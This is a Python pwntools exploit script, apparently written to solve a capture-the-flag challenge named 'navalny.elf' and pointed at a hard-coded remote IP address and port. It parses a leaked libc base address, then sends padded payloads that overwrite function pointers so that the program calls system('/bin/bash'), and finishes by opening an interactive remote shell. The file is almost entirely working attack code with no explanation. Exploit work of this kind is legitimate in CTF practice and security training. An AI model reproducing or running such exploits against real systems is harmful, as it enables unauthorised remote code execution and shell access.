#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./navalny.elf --host 109.233.56.90 --port 11625
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./navalny.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11625)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc = ELF('libc-2.31.so')

# libc_base = io.recvuntil(b'/usr/lib/x86_64-linux-gnu/libc-2.31.so').split('\n')[-1].split('-')[0]
# libc.address = int(libc_base, 16)

# libc.address = 0x7ffff7de4000
io.recvuntil("rw-p 00000000 00:00 0")
io.recvline()
LIBC_base = int(io.recvline()[:12],16)
log.info(f"Libc pointer = {hex(LIBC_base)}")
libc.address = LIBC_base

PUTS = libc.sym['puts']
PRINTF = libc.sym['printf']
CANARY = libc.sym['__stack_chk_fail']
GETS = libc.sym['gets']
SYSTEM = libc.sym['system']

io.sendline(cyclic(544) + p64(PUTS) + p64(CANARY) + p64(PRINTF) + p64(PRINTF) + p64(GETS))
io.recvuntil(b'Now you can do whatever you want: ')
io.sendline(b'/bin/bash\x00' + cyclic(534) + p64(PUTS) + p64(CANARY) + p64(SYSTEM) + p64(PRINTF) + p64(GETS))

io.interactive()
